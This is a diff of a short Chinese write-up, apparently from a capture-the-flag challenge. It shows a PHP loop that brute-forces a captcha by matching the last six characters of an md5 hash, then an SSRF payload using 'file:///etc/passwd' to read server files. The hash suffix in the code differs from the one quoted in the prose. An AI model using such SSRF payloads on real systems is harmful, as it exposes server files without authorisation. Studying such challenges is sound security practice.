@@ -1,5 +1,7 @@
 Captcha的地方写着代码：substr(md5(captcha), -6, 6) == "974961"，很明显验证码的md5值的后六位要等于指定的数字。
-<?php
+    <html>
+      <head>
+          <?php
 for ($i=0; $i < 1000000000; $i++) {
     $a = substr(md5($i), -6, 6);
     if ($a == "fc6943") {   //此处为==后面的内容
@@ -8,6 +10,9 @@ for ($i=0; $i < 1000000000; $i++) {
     }
 }
 ?>
+      </head>
+    </html>
+
 
 解决了验证码的问题后，我们可以试着通过SSRF中URL伪协议file://来访问服务器的文件，例如/etc/passwd
 url=file:///etc/passwd&captcha=*****
